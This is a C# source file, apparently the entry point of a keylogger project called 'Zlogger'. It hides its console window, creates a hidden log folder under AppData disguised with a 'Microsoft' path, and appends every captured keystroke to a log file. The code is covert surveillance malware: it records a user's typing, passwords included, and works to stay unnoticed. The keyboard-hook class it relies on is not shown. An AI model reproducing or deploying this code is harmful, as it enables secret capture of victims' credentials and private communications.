using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Rodjenihm.Zlogger.Core;
using Rodjenihm.Zlogger.WinAPI;

namespace Rodjenihm.Zlogger
{
    class Program
    {
        static void Main(string[] args)
        {
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var logName = "log.txt";
            var logDir = Path.Combine(appData, "Microsoft", "Zlogger");
            var logPath = Path.Combine(logDir, logName);
            Directory.CreateDirectory(logDir).Attributes = FileAttributes.Directory | FileAttributes.Hidden;

            var handle = Kernel32.GetConsoleWindow();
            User32.ShowWindow(handle, (int)WindowState.SW_HIDE);
            using (var keylogger = new Keylogger(logPath))
            {
                keylogger.KeyDown += (sender, e) =>
                {
                    using (var sw = new StreamWriter(keylogger.LogPath, true))
                    {
                        sw.Write((Keys)e.VkCode);
                    }
                };

                keylogger.Run();
                Application.Run();
            }
        }
    }
}
